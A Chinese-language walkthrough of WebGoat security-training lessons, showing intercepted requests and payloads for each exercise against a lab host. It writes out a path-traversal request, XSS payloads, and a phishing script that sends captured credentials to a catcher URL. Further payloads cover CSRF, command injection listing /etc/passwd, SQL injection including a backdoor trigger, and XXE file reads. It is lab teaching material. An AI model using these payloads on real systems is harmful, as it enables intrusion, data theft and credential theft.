# 开始
打开浏览器，输入

```
http://IP:port/WebGoat/login.mvc
```
使用账号webgoat，密码webgoat进行登录

# General
## Http Basics（HTTP基础）
该选项是显示HTTP数据包的内容，使用burpsuit代理抓取数据包，我在EnterYourName输入1，下面数据包person参数接收1。


```
POST /WebGoat/attack?Screen=1869022003&menu=100 HTTP/1.1
Host: 192.168.1.210:7777
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.210:7777/WebGoat/start.mvc
Content-Length: 19
Cookie: JSESSIONID=B8907B42F9751C6E4337FA3B8FDB43BD; PHPSESSID=cl1c210ok5rrhqfhcjfu2f0pp4; security=medium
Connection: close

person=1&SUBMIT=Go!
```



#  Access Control Flaws（访问控制缺陷）
## Using an Access Control Matrix（使用访问控制矩阵）
在基于角色的访问控制方案中，角色表示一组访问权限和权限。用户可以被分配一个或多个角色。基于角色的访问控制方案通常由角色权限管理和角色分配两部分组成。基于角色的访问控制方案可能允许用户执行他/她分配的角色不允许的访问，或以某种方式允许向未授权角色提升权限。

 

一般目标：

每个用户都是允许访问某些资源的角色的成员。您的目标是探索管理此网站的访问控制规则。只有[Admin]组才能访问“Account Manager”资源。

示范如下：

MOE用户不允许访问该组

![image]({path}/1.png) 

Larry允许访问该组，左上角打钩代表课程完成。

![image]({path}/2.png) 


## Bypass a Path Based Access Control Scheme（绕过路径访问控制方案）
‘webgoat’用户可以访问lessonPlans/en目录中的所有文件。 尝试破坏访问控制机制并访问不在列出的目录中的资源。 选择要查看的文件后，WebGoat将报告是否授予对文件的访问权限。 尝试获取的有趣文件可能是像WEB-INF/spring-security.xml这样的文件。 请记住，文件路径将根据WebGoat的启动方式而有所不同。

当前路径：


```
/.extract/webapps/WebGoat/plugin_extracted/plugin/BlindStringSqlInjection/lessonPlans/en/BlindStringSqlInjection.html
```

![image]({path}/3.png) 


现在我们要获取WEB-INF/spring-security.xml文件的内容。首先说一下../代表上一级目录，其次我们要找到文件的路径，最后更改文件路径。

操作如下，使用burpsuit修改File参数的内容：


```
POST /WebGoat/attack?Screen=231255157&menu=200 HTTP/1.1
Host: 192.168.1.210:7777
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.210:7777/WebGoat/start.mvc
Content-Length: 50
Cookie: JSESSIONID=B8907B42F9751C6E4337FA3B8FDB43BD; PHPSESSID=cl1c210ok5rrhqfhcjfu2f0pp4; security=medium
Connection: close

File=../../../../../WEB-INF/spring-security.xml&SUBMIT=View+File
```

 
![image]({path}/4.png) 

![image]({path}/5.png) 

 

## LAB: Role Based Access Control（基于角色的访问控制）
该类型分四个阶段，故而在下面阶段演示。

## Stage 1: Bypass Business Layer Access Control（阶段1：绕过业务层访问控制）
作为普通员工“tom”，利用弱访问控制来使用“职员列表”页面中的“删除”功能。验证可以删除汤姆的个人资料。用户的密码是小写的给定名称（例如Tom Cat的密码是“tom”）。

![image]({path}/6.png) 

登录进去之后，对ViewProfile按钮进行抓包

![image]({path}/7.png) 

修改action参数的内容为DeleteProfile，然后发送数据包即可。

![image]({path}/8.png) 

![image]({path}/9.png) 

## Stage 2: Add Business Layer Access Control（修改代码忽略）.
本课程仅与WEBGOAT的开发者版本协调工作

执行修复以拒绝未经授权的访问删除功能。为此，您必须更改WebGoat代码。完成此操作后，重复第1步，并验证是否正确地拒绝对DeleteProfile功能的访问。



## Stage 3: Breaking Data LayerAccess Control（阶段3：打破数据层访问控制）
目标：作为普通员工“tom”，利用弱访问控制来查看其他员工的个人资料。

使用tom用户登录

![image]({path}/10.png) 

对viewprofile按钮进行抓包，105是tom的ID号，而Larry的ID号为101，修改ID为101

![image]({path}/11.png) 

![image]({path}/12.png) 

## Stage 4: Add Data Layer Access Control.（阶段4：添加数据层访问控制。）略
# AJAX Security
## DOM Injection
*您的受害者是一个系统，需要一个激活密钥才能使用它。

*您的目标应该是尝试启用激活按钮。

*请花一些时间查看HTML源码，以了解关键验证过程的工作原理。

使用调试器，找到activate按钮的源代码，将disable=“”这一段删除，然后按钮启用，点击按钮即可。

![image]({path}/13.png) 

![image]({path}/14.png) 

## LAB: DOM-Based cross-site scripting
### 阶段1：对于本练习，您的任务是使用以下位置的图像对本网站进行描述：OWASP IMAGE

在输入框输入

```
<img src=”images/logos/owasp.jpg” />
```

点击按钮

![image]({path}/15.png)

![image]({path}/16.png)

### 阶段2：现在，尝试使用image标签创建JavaScript警报

在输入框输入

```
<img src=test onerror=”alert(‘this is xss test’)”>
```

点击按钮即可

![image]({path}/17.png)

![image]({path}/18.png)


### 阶段3：接下来，尝试使用IFRAME标签创建JavaScript警报。

在输入框输入

```
<iframe src=javascript:alert(0)></iframe>
```

点击按钮即可

![image]({path}/19.png)

![image]({path}/20.png)

### 阶段4：使用以下命令创建假登录表单：


```
Please enter your password:<BR><input type = "password" name="pass"/><button onClick="javascript:alert('I have your password: ' + pass.value);">Submit</button><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>
```

![image]({path}/21.png)

![image]({path}/22.png)

## 阶段5：执行客户端HTML实体编码以减轻DOM (修复漏洞，省略)



## LAB: Client Side Filtering（LAB：客户端过滤）
### 阶段1：
您以山羊山金融公司（CSO）Moe Stooge的身份登录。您可以访问公司信息中的每个人，除了CEO，内维尔巴塞洛缪。或者至少你不应该访问CEO的信息。对于此练习，请检查页面的内容，以查看可以找到的额外信息。
随便点击菜单选选择一个用户
使用调试器，找到Bartholomew，输入450000

![image]({path}/23.png)

![image]({path}/24.png)

### 阶段2（修改代码，省略）


## XML Injection
WebGoat-Miles奖励里程显示所有可用的奖励。 输入帐户号码后，课程将显示您的余额和您负担得起的产品。 您的目标是尝试为您所允许的一套奖励增加更多奖励。 您的帐户ID是836239。

在输入框输入836239


![image]({path}/25.png)

使用调试器找到勾选框所在的源代码，添加两个<tr>,然后将所有框都打上勾


```
<tr><td><input name="check1004" type="checkbox"></td><td>WebGoat Core Duo Laptopt 	2000 Pts</td></tr>
<tr><td><input name="check1005" type="checkbox"></td><td>WebGoat Hawaii Cruise 	3000 Pts</td></tr>
```

![image]({path}/26.png)

打上所有的勾

![image]({path}/27.png)

![image]({path}/28.png)

## JSON Injection
*您从波士顿，MA-机场代码BOS到西雅图，WA – 机场代码SEA。

*输入机场的三位数代码后，将会执行一个AJAX请求，询问机票价格。

*你会注意到有两个航班可用，一个昂贵的一个没有停止，另一个便宜的一个有2站。

*你的目标是试图要一个没有停止，但更便宜的价格。

正常是这样

![image]({path}/29.png)


使用burpsuit抓取，并显示响应包



![image]({path}/30.png)

![image]({path}/31.png)

随便点击购买

![image]({path}/32.png)

![image]({path}/33.png)

还有另外一种思路，直接改最后的数据包

![image]({path}/34.png)



## Silent Transactions Attacks（静默交易攻击）
*这是一个示例的网上银行应用程序 – 汇款页面。

*显示在您的余额之下，您转移的账户和您将转账的金额。

*应用程序使用AJAX在进行一些基本的客户端验证后提交交易。

*您的目标是尝试绕过用户的授权，并以静默方式执行交易。

![image]({path}/36.png)


在调试器输入javascript:submitData(12345,11111111111)

![image]({path}/37.png)

![image]({path}/38.png)

## Insecure Client Storage（不安全的客户端存储）
### 阶段1：
对于此练习，您的任务是发现优惠券代码以获得意想不到的折扣。

使用firebug查看数据包，发现一个js

![image]({path}/39.png)

在控制器输入

```
javascript:decrypt("nvojubmq")
```

![image]({path}/40.png)

![image]({path}/41.png)

获取到优惠码PLATINUM

### 阶段2：
现在，尝试免费获得整个订单。
使用firebug修改价格

![image]({path}/42.png)

![image]({path}/43.png)


## Dangerous Use of Eval
对于这个练习，你的任务是提出一些包含脚本的输入。您必须尝试将此页面反映回您的浏览器，这将执行脚本。为了通过本课程，您必须’alert（）’document.cookie。

在输入框输入


```
123')%3Balert(document.cookie)%3B('
```

![image]({path}/44.png)

![image]({path}/45.png)


## Same Origin Policy Protection
本演示演示了同源政策保护。 XHR请求只能被传回给始发服务器。尝试将数据传递到非始发服务器将失败。

输入网址：

```
/WebGoat/plugin_extracted/plugin/SameOriginPolicyProtection/jsp/sameOrigin.jsp
```

![image]({path}/46.png)


输入网址：


```
https://www.baidu.com/
```

![image]({path}/47.png)



# Authentication Flaws（认证漏洞）
## Password Strength（密码强度）
您的Web应用程序的帐户与密码一样安全。对于此练习，您的工作是在

```
https://howsecureismypassword.net
```

上测试多个密码。 您必须同时测试所有6个密码…

在你的应用程序你应该设置好的密码要求！

桌面电脑需要多少时间来破解这些密码？

点击show sources,按照代码提示输入

![image]({path}/48.png)

## Forgot Password（忘记密码）
Web应用程序经常为用户提供检索忘记密码的能力。 不幸的是，许多Web应用程序无法正确实现机制。 验证用户身份所需的信息往往过于简单。

一般目标：

如果用户可以正确回答这个秘密问题，用户可以检索密码。这个“忘记密码”页面上没有锁定机制。您的用户名是“webgoat”，您最喜欢的颜色是“red”。目标是检索另一个用户的密码。

输入webgoat,再输入red就可以进入到webgoat用户。那么，我检索admin用户。

![image]({path}/49.png)

**输入admin，进去**

![image]({path}/50.png)

输入red，报错

![image]({path}/51.png)

![image]({path}/52.png)

输入green成功

![image]({path}/53.png)

## Multi Level Login 1
阶段1：这个阶段只是为了展示一个经典的多登录是如何工作的。您的目标是通过用户Jane和密码tarzan进行常规登录。您有以下TAN：

Tan＃1 = 15648

Tan＃2 = 92156

Tan＃3 = 4879

Tan＃4 = 9458

Tan＃5 = 4879

进行登录

当你通过社会工程学获取到用户名jane和密码tarzan和一个tan的时候，但是你登录之后系统却要你输入其他tan，这时候可以这种做
使用web developoer显示表单内容

![image]({path}/54.png)

原本系统显示tan#1，但是我知道tan#2，我就可以改成tan#2

![image]({path}/55.png)

![image]({path}/56.png)


## Multi Level Login 2

原理跟上面一样，唯一不同的是可以改到其他用户

![image]({path}/57.png)

使用web developoer显示表单内容，修改名字为Jane

![image]({path}/58.png)

![image]({path}/59.png)



# Buffer Overflows
## Off-by-One Overflows（逐个溢出）
第一步操作，东西随便填。

![image]({path}/60.png)

第二步操作，使用burpsuit拦截

![image]({path}/61.png)

![image]({path}/62.png)

将拦截到数据包发送到intruder

![image]({path}/63.png)

![image]({path}/64.png)

开始爆破 

![image]({path}/65.png)


# Code Quality（代码质量）
## Discover Clues in the HTML（在HTML中发现线索）
开发人员在源代码中留下诸如FIXME，TODO，Code Broken，Hack等的信息。 以下是基于表单的身份验证形式的示例。 寻找帮助您登录的线索。

右键查看元素

![image]({path}/66.png)

# Concurrency（并发）
## Thread Safety Problems（线程安全问题）
用户应该能够利用此Web应用程序中的并发错误，并查看正在尝试同一功能的另一个用户的登录信息。这将需要使用两个浏览器。有效的用户名为’jeff’和’dave’。
请输入您的用户名以访问您的帐户。

手速要快！！！打开两个浏览器输入jeff

![image]({path}/67.png)

## Shopping Cart Concurrency Flaw（购物车并发缺陷）
对于此练习，您的任务是利用并发问题，这样可以以更低的价格购买商品。

A浏览器选择购买

![image]({path}/68.png)

![image]({path}/69.png)

B浏览器选择更新

![image]({path}/70.png)

然后在A浏览器看到可以用较低的钱买价格高的东西


![image]({path}/71.png)

![image]({path}/72.png)

# Cross-Site Scripting (XSS)
Phishing with XSS（网络钓鱼XSS）
本课程是网页如果在网页上发生已知XSS攻击时可能支持网络钓鱼攻击的示例

以下是标准搜索功能的示例。

使用XSS和HTML插入，您的目标是：

     将html插入该请求凭据

     添加javascript以实际收集凭据

     将凭据发送到http://localhost:8080/WebGoat/catcher?PROPERTY=yes…

要通过本课程，凭证必须发布到捕获者servlet。

在输入框输入一下代码
**注意要修改IP和端口**

```
</form><script>function hack(){ XSSImage=new Image; XSSImage.src="http://192.168.1.210:7777/WebGoat/catcher?PROPERTY=yes&user=" + document.phish.user.value + "&password=" + document.phish.pass.value + "";alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + " Password = " + document.phish.pass.value);} </script><form name="phish"><br><br><HR><H3>This feature requires account login:</H2><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
```

![image]({path}/73.png)



## LAB: Cross Site Scripting
## Stage 1: Stored XSS
第一步，先使用tom账号登录（密码：tom）
![image]({path}/74.png)

![image]({path}/75.png)

![image]({path}/76.png)

输入
```
<script>alert(0)</script>
```

![image]({path}/77.png)

第二步，使用HR(密码：jerry）号登录，查看tom的信息

![image]({path}/78.png)

![image]({path}/79.png)

![image]({path}/80.png)
 

## Stage 2: Block Stored XSS using Input Validation（修复过程略）
## Stage 3: Stored XSS Revisited
验证Bruce的个人简介中包含有XSS攻击，使用David用户（密码：david）登录，查看Bruce的个人简介，出现弹窗，表明存在XSS攻击。

![image]({path}/81.png)

![image]({path}/82.png)

## Stage 4: Block Stored XSS using Output Encoding（修复过程略）
##  Stage 5: Reflected XSS

使用用户Larry（密码：larry）登录，在Search Staff搜索框中输入。


```
<script>alert(0)</script>
```

![image]({path}/83.png)

![image]({path}/84.png)

## Stage 6: Block Reflected XSS（修复过程略）
## Stored XSS Attacks（存储型XSS）
在表单输入

```
<script>alert(0)</script>
```

![image]({path}/85.png)

![image]({path}/86.png)


## Reflected XSS Attacks（反射型XSS）

在表单输入

```
<script>alert(0)</script>
```
![image]({path}/87.png)

![image]({path}/88.png)



## Cross Site Request Forgery (CSRF)
您的目标是向新闻组发送电子邮件。 该电子邮件包含一个图像，其URL指向恶意请求。 在本课中，URL应该指向“攻击”servlet，其中包含课程的“屏幕”和“菜单”参数，以及具有任意数值的额外参数“transferFunds”（如5000）。您可以通过查找“屏幕”来构建链接 “和”菜单“值在右侧的参数插入。 当时通过身份认证的CSRF电子邮件的接收者将转移资金。 当本课程的攻击成功时，左侧菜单中的课程名称旁边会显示一个绿色的勾号。



```
<img src="attack?Screen=2078372&menu=900&transferFunds=5000"/>
```

![image]({path}/89.png)

![image]({path}/90.png)


## CSRF Prompt By-Pass
类似于CSRF课程，您的目标是向包含多个恶意请求的新闻组发送电子邮件：第一个转移资金，第二个请求确认第一个请求触发的提示。 URL应该使用此CSRF-prompt-by-pass课程的屏幕，菜单参数和具有数字值（例如“5000”）的额外参数“transferFunds”来指向攻击小服务程序，以启动传输和字符串值“CONFIRM” 完成它。 您可以从右侧的插图复制课程参数，创建格式为“attack？Screen = XXX＆menu = YYY＆transferFunds = ZZZ”的网址。 谁收到这封电子邮件，恰好在当时被认证，将有资金转移。 当您认为攻击成功时，刷新页面，您将在左侧菜单中找到绿色检查。

**注意修改IP和端口**
```
<img src="http://192.168.8.89:8080/WebGoat/attack?Screen=227&menu=900&transferFunds=5000" onerror="document.getElementById('image2').src='http://192.168.8.89:8080/WebGoat/attack?Screen=227&menu=900&transferFunds=CONFIRM'"> <imgid="image2">
```
![image]({path}/91.png)

![image]({path}/92.png)

## CSRF Token By-Pass
类似于CSRF课程，您的目标是向包含恶意请求转移资金的新闻组发送电子邮件。 要成功完成，您需要获取有效的请求令牌。 提供转账资金表单的页面包含一个有效的请求令牌。 转移资金页面的URL是本课程的“屏幕”和“菜单”查询参数以及额外的参数“transferFunds = main”的“攻击”servlet。 加载此页面，读取令牌，并在伪造的请求中附加令牌以传输数据。 当您认为攻击成功时，刷新页面，您将在左侧菜单中找到绿色检查。

**注意修改IP和端口**
```
<script>
var readToken = function(){
var doc = document.getElementById("frame1").contentDocument
var token = doc.getElementsByName("CSRFToken")[0].getAttribute("value");
alert(token);
var frame2 = document.getElementById("frame2");
frame2.src = "http://192.168.8.89:8080/WebGoat/attack?Screen=2&menu=900&transferFunds=4000&CSRFToken="+token;
}

</script>
<iframe id="frame2" >
</iframe>
<iframe id="frame1" onload="readToken()" src="http://192.168.8.89:8080/WebGoat/attack?Screen=2&menu=900&transferFunds=main" >
</iframe>
```

![image]({path}/93.png)

![image]({path}/94.png)

## HTTPOnly Test
为了帮助减轻跨站点脚本威胁，Microsoft已经推出了一个名为“HttpOnly”的新Cookie。 如果设置了此标志，则浏览器不允许客户端脚本访问该cookie。 由于属性相对较新，因此若干浏览器忽略了正确处理新属性。

有关受支持浏览器的列表，请参阅：OWASP HTTPOnly支持

一般目标：

本课的目的是测试您的浏览器是否支持HTTPOnly cookie标志。 注意unique2u cookie的值。 如果您的浏览器支持HTTPOnly，并且您启用Cookie，则客户端代码无法读取或写入该cookie，但浏览器仍可将其值发送到服务器。 某些浏览器只能防止客户端读取访问，但不要阻止写入访问。

打开HTTPOnly属性后，在浏览器地址栏中输入“javascript：alert（document.cookie）”。 注意除了unique2u cookie之外，所有Cookie都会显示。

![image]({path}/95.png)

![image]({path}/96.png)

![image]({path}/97.png)

![image]({path}/98.png)


# Improper Error Handling（不当的错误处理）
## Fail Open Authentication Scheme（失败的认证方案）
由于认证机制中的错误处理问题，可以在不输入密码的情况下认证为“webgoat”用户。 尝试以webgoet用户身份登录，而不指定密码。

使用burpsuite抓取数据包

![image]({path}/99.png)

删除password参数

![image]({path}/100.png)

![image]({path}/101.png)

# Injection Flaws
## Command Injection（命令注入）
命令注入攻击是对任何参数驱动的站点的严重威胁。攻击背后的方法易于学习，造成的损害可能会从相当大的到完全的系统妥协。尽管有这些风险，互联网上的令人难以置信的系统容易受到这种形式的攻击。

不仅容易引起威胁，而且也是一个威胁，有一点常识和预想，几乎完全可以防止。本课将向学生展示参数注入的几个例子。

清理所有输入数据，特别是将在OS命令，脚本和数据库查询中使用的数据是一贯的良好做法。

尝试向操作系统注入一个命令。

使用burpsuite抓取数据包

![image]({path}/102.png)

修改内容
使用urlencode
```
HelpFile=%41%63%63%65%73%73%43%6f%6e%74%72%6f%6c%4d%61%74%72%69%78%2e%68%65%6c%70%22%2c%6c%73%20%22%2f%65%74%63%2f%70%61%73%73%77%64&SUBMIT=View
```

![image]({path}/103.png)

![image]({path}/104.png)

![image]({path}/105.png)

## Numeric SQL Injection（数字型注入）

使用burpsuite抓取数据包

![image]({path}/106.png)

![image]({path}/107.png)

![image]({path}/108.png)


## Log Spoofing（日志欺骗）
*以下灰色区域表示Web服务器的日志文件中将要记录的内容。

*您的目标是让用户名“admin”成功登录。

*通过向日志文件添加脚本来提升攻击。

在输入框输入：

```
Smith%0d%0aLogin Succeeded for username: admin
```

![image]({path}/109.png)

![image]({path}/110.png)


## XPATH Injection
下面的表格允许员工查看他们所有的个人资料，包括他们的工资。 您的帐户是Mike / test123。 您的目标是尝试查看其他员工的数据。

在用户输入框输入

```
Smith' or 1=1 or 'a'='a
```

密码框随便输入

![image]({path}/111.png)

![image]({path}/112.png)


## String SQL Injection（字符串注入）

SQL注入攻击是对任何数据库驱动的站点的严重威胁。攻击背后的方法易于学习，造成的损害可能会从相当大的到完全的系统妥协。尽管有这些风险，互联网上的令人难以置信的系统容易受到这种形式的攻击。

不仅容易引起威胁，还可以轻而易举地预防这种威胁。

即使以其他方式阻止了SQL注入的威胁，所有的操作都是清理所有输入数据，尤其是在OS命令，脚本和数据库查询中使用的数据。

一般目标：

下面的表格允许用户查看他们的信用卡号码。尝试注入一个SQL字符串，导致显示所有信用卡号。尝试用户名“史密斯”。

现在您已成功执行SQL注入，请尝试对参数化查询进行相同类型的攻击。如果您希望返回到可注入的查询，请重新启动课程。

输入

```
Smith' OR '1'='1
```

![image]({path}/113.png)

![image]({path}/114.png)

## LAB: SQL Injection
## Stage 1: String SQL Injection

使用burpsuite抓取数据包

![image]({path}/115.png)

![image]({path}/116.png)

## Stage 2: Parameterized Query #1（修复方式：参数化查询）
## Stage 3: Numeric SQL Injection
使用larry用户登录

![image]({path}/117.png)


```
or 1=1 order by employee_id desc
```

![image]({path}/118.png)

![image]({path}/119.png)


## Stage 4: Parameterized Query #2（修复方式：参数化查询）
## Database Backdoors（数据库后门）

```
101;update employee set salary=1234567 where userid=101
```

![image]({path}/120.png)



```
101;create trigger mybackdoor before insert on employee foreach row begin update employee setemail='john@hackme.com' where userid=new.userid
```

![image]({path}/121.png)


## Blind Numeric SQL Injection（数字型盲注）

```
101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444') > 1000 );
```

![image]({path}/122.png)

![image]({path}/123.png)


一直用二分法找到数字是2364

![image]({path}/124.png)

## Blind String SQL Injection（字符串盲注）

```
101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 1, 1) < 'H' );
```

![image]({path}/125.png)

第二个字符：改成2，以此类推。


```
101 AND (SUBSTRING((SELECT name FROM pinsWHERE cc_number='4321432143214321'), 2, 1) < 'H' );
```

![image]({path}/126.png)

答案找到是Jill

# Denial of Service（拒绝服务攻击）
## ZipBomb（压缩包炸弹）
服务器只接受ZIP文件，在上传后提取它们，并与其一起删除，并提供20 MB的临时存储来处理所有请求，尝试执行DOS攻击，消耗所有临时存储与一个请求

简单来说，一直上传低于20M的压缩包，把服务器弄崩溃

## Denial of Service from Multiple Logins(多个用户拒绝服务攻击)
先获取所有帐号

![image]({path}/127.png)

![image]({path}/128.png)

打开三个浏览器进行登录，使用三个不同的用户登录

![image]({path}/129.png)


# Insecure Communication（不安全的通讯）
## Insecure Login（不安全登录）
使用调试器看到密码

![image]({path}/130.png)

![image]({path}/131.png)

第二阶段改成https

![image]({path}/132.png)

![image]({path}/133.png)

# Insecure Storage（不安全存储）
## Encoding Basics（加密基础）

随便输入一下字符串

![image]({path}/134.png)


# Malicious Execution（恶意执行）
## Malicious File Execution（恶意文件执行）

```
<HTML>
<%
java.io.File file = new java.io.File("/.extract/webapps/WebGoat/mfe_target/webgoat.txt");
file.createNewFile();
%>
</HTML>
```
![image]({path}/135.png)

![image]({path}/136.png)

保存成jsp上传

打开

```
http://192.168.1.210:7777/WebGoat/uploads/1.jsp
```


# Parameter Tampering（参数修改）
## Bypass HTML Field Restrictions
将表单启用，再使用burpsuit抓包，随便修改6个参数内容

![image]({path}/137.png)

![image]({path}/138.png)

![image]({path}/139.png)

## XML External Entity (XXE)

在表单输入随便输入内容，然后用burpsuite抓包，将数据包的内容替换成下面的内容
```
<?xml version="1.0"?>
<!DOCTYPE Header [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<searchForm> <from>&xxe;</from></searchForm>
```
![image]({path}/140.png)

![image]({path}/141.png)

![image]({path}/142.png)

## Exploit Hidden Fields（利用隐藏的字段）
简单来说，就是改了前端的值

![image]({path}/143.png)

![image]({path}/144.png)

点击updatecard进行更新

## Exploit Unchecked Email
此表格是客户支持页面的示例。 使用下面的表单尝试：

1）向网站admin发送恶意脚本。

2）从OWASP向“朋友”发送恶意脚本。

![image]({path}/145.png)

将邮件地址修改为test@gmail.com即可触发成功

![image]({path}/146.png)

![image]({path}/147.png)

## Bypass Client Side JavaScript Validation（绕过客户端JS验证）
该网站执行客户端和服务器端验证。 对于此练习，您的工作是打破客户端验证并发送不期望的网站输入。 您必须同时打破所有7个验证器。

把那个前端正则验证函数删除

![image]({path}/148.png)

![image]({path}/149.png)

![image]({path}/150.png)

# Session Management Flaws
## Hijack a Session（会话劫持）

Cookie里面的WEAKID这个参数是会话标识。我们知道如果客户端发送给Web服务器的请求里面没有会话标识的话，服务器会从新生成一个新的会话标识并通过Cookie返回给客户端

在表单随便输入内容，使用burpsuite进行抓包，将weakid给删除

![image]({path}/151.png)

发送数据包到sequencer选项，选择cookie那一栏，然后就start live capture

![image]({path}/152.png)

显示fuzz的结果，然后保存token，用来下面爆破他的cookie

![image]({path}/153.png)


将没有删除weakid的数据包发送到intruder模块进行爆破

![image]({path}/154.png)

读取生成后的token

![image]({path}/155.png)

下面这些都是爆破成功的token

![image]({path}/156.png)

##  Spoof an Authentication Cookie（欺骗认证Cookie）

Webgoat:AuthCookie=65432ubphcfx

Aspect:AuthCookie=65432udfqtb

alice用户的cookie是65432fdjmb

分析cookie，64532是不变的，后面的字符串是经历逆转字符串，然后往后推一位

![image]({path}/157.png)

修改cookie为alice的cookie

![image]({path}/158.png)

![image]({path}/159.png)

## Session Fixation（会话固定）
在网站后面添加&SID=test

![image]({path}/160.png)

点击攻击者所构造的链接

![image]({path}/161.png)


按照提示输入用户名和密码

![image]({path}/162.png)

直接打开/WebGoat/start.mvc#attack/2007866518/1800&SID=test

![image]({path}/163.png)

![image]({path}/164.png)

![image]({path}/165.png)


# Web Services
## Create a SOAP Request
Web服务通过使用SOAP请求进行通信。 这些请求被提交给Web服务，试图执行在Web服务定义语言（WSDL）中定义的功能。 让我们来了解一些关于WSDL文件的内容。 查看WebGoat的Web服务描述语言（WSDL）文件。

一般目标：

尝试使用浏览器或Web Service工具连接到WSDL。 Web服务的URL是：http://localhost/WebGoat/services/SoapRequest通常可以在Web服务请求的末尾添加一个WSDL来查看WSDL。 您必须访问2个操作才能通过本课程。

拦截请求并通过发送有效的帐户的有效SOAP请求来调用任何方法。
您必须至少访问2个方法来传递课程。

### 第一阶段
查看WSDL有几个operation

```
/WebGoat/services/SoapRequest?WSDL
```
![image]({path}/166.png)

![image]({path}/167.png)

### 第二阶段
查看WSDL的getFirstNameRequest的方法是什么

![image]({path}/168.png)

![image]({path}/169.png)

## WSDL Scanning

![image]({path}/171.png)

修改参数内容

![image]({path}/172.png)

![image]({path}/173.png)

## Web Service SAX Injection
Web服务通过使用SOAP请求进行通信。 这些请求被提交给Web服务，以尝试执行在Web服务定义语言（WSDL）文件中定义的功能。

一般目标：

一些Web界面在后台使用Web服务。 如果前端依赖于Web服务进行所有输入验证，则可能会破坏Web界面发送的XML。

在本练习中，尝试更改101以外的用户的密码。

在输入框输入下面内容

```
<id xsi:type='xsd:int'>102</id>
<password xsi:type='xsd:string'>P@$$w0rd?</password>
```

![image]({path}/174.png)

## Web Service SQL Injection
使用burpsuit的插件wsdler

![image]({path}/175.png)

然后将wsdler的数据包发送到repeater

![image]({path}/176.png)

修改内容

![image]({path}/177.png)